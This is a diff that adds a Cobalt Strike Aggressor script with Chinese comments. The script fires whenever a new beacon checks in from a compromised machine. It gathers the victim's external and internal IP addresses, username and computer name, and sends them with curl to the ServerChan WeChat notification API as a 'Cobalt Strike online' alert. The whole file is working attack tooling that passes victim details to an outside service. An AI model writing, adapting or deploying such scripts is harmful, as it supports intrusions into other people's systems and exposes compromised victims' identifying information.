@@ -1,0 +1,16 @@
+on beacon_initial {
+    # server酱 API地址
+    $serverchains_api = 'https://sctapi.ftqq.com/在这里替换server酱的SendKey.send';
+
+    #获取ip、计算机名、登录账号
+    $externalIP = replace(beacon_info($1, "external"), " ", "_");
+    $internalIP = replace(beacon_info($1, "internal"), " ", "_");
+    $userName = replace(beacon_info($1, "user"), " ", "_");
+    $computerName = replace(beacon_info($1, "computer"), " ", "_");
+
+    # server酱
+    $serverchains_msg = 'title=Cobalt Strike上线通知&desp='.'%0d%0a%0d%0a出口IP: '.$externalIP.'%0d%0a%0d%0a内网IP: '.$internalIP.'%0d%0a%0d%0a用户名: '.$userName.'%0d%0a%0d%0a计算机名: '.$computerName;
+    # 通过curl调用server酱 API
+    @curl_command_wechat = @('curl','-X','POST','-d',$serverchains_msg,$serverchains_api);
+    exec(@curl_command_wechat);
+}
